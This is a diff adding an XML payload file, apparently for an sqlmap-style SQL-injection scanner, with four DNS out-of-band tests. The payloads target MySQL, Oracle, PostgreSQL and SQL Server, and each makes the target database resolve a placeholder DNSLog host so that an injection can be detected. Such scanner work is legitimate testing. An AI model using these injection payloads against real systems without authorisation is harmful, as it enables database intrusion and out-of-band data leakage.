@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- DNS out-of-band tests（本工具自定义，stype=7） -->
+    <!-- 命中判定不依赖页面响应：payload触发数据库向 injectstr.domain 发起DNS解析， -->
+    <!-- 由DNSLog平台侧记录回收确认。injectstr为检测时动态生成的唯一token，domain替换为配置的DNSLog域名。 -->
+
+    <!-- MySQL：load_file触发UNC路径DNS解析，仅Windows目标有效（Linux无UNC解析） -->
+    <test>
+        <title>MySQL DNS out-of-band (LOAD_FILE UNC)</title>
+        <stype>7</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT LOAD_FILE(CONCAT('\\\\','injectstr.domain','\\x')))</vector>
+        <request>
+            <payload>AND (SELECT LOAD_FILE(CONCAT('\\\\','injectstr.domain','\\x')))</payload>
+        </request>
+        <response>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <!-- Oracle/达梦：utl_inaddr.get_host_address直接触发DNS解析 -->
+    <test>
+        <title>Oracle DNS out-of-band (UTL_INADDR.GET_HOST_ADDRESS)</title>
+        <stype>7</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('injectstr.domain') FROM DUAL) IS NOT NULL</vector>
+        <request>
+            <payload>AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('injectstr.domain') FROM DUAL) IS NOT NULL</payload>
+        </request>
+        <response>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <!-- PostgreSQL/金仓/OpenGauss：dblink触发DNS解析（需dblink扩展权限） -->
+    <test>
+        <title>PostgreSQL DNS out-of-band (dblink)</title>
+        <stype>7</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT 1 FROM dblink('host=injectstr.domain port=53 user=x password=x dbname=x','select 1') AS t(i int)) IS NOT NULL</vector>
+        <request>
+            <payload>AND (SELECT 1 FROM dblink('host=injectstr.domain port=53 user=x password=x dbname=x','select 1') AS t(i int)) IS NOT NULL</payload>
+        </request>
+        <response>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- SQLServer：堆叠xp_dirtree触发UNC路径DNS解析（需要堆叠注入能力，风险2） -->
+    <test>
+        <title>Microsoft SQL Server DNS out-of-band (stacked xp_dirtree)</title>
+        <stype>7</stype>
+        <level>1</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>;EXEC master..xp_dirtree '\\injectstr.domain\x'-- </vector>
+        <request>
+            <payload>;EXEC master..xp_dirtree '\\injectstr.domain\x'-- </payload>
+        </request>
+        <response>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+</root>
